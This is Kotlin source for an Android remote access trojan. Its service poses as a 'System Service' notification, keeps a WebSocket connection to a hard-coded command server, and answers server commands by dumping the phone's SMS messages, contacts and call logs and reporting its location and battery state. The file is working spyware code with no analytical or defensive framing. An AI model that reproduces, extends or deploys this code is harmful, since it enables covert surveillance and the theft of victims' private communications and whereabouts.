package com.rat

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainService : Service() {
    private lateinit var webSocket: WebSocket
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    private val deviceId = "device_" + System.currentTimeMillis()

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        connect()
    }

    private fun connect() {
        val request = Request.Builder().url("wss://my-server-pjy2.onrender.com/ws/$deviceId").build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {}
            override fun onMessage(webSocket: WebSocket, text: String) {
                handleCommand(text)
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Thread.sleep(5000)
                connect()
            }
        })
    }

    private fun handleCommand(raw: String) {
        try {
            val obj = JSONObject(raw)
            val reqId = obj.getString("req_id")
            val action = obj.getString("action")
            val args = obj.optJSONObject("args") ?: JSONObject()

            val result = when (action) {
                "sms_dump" -> SmsHandler.dump(this)
                "contacts_dump" -> ContactsHandler.dump(this)
                "call_logs" -> CallLogHandler.dump(this)
                "location" -> LocationHandler.get(this)
                "battery" -> InfoHandler.battery(this)
                else -> "unknown action"
            }

            val response = JSONObject()
            response.put("req_id", reqId)
            response.put("data", result)
            webSocket.send(response.toString())
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "rat_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
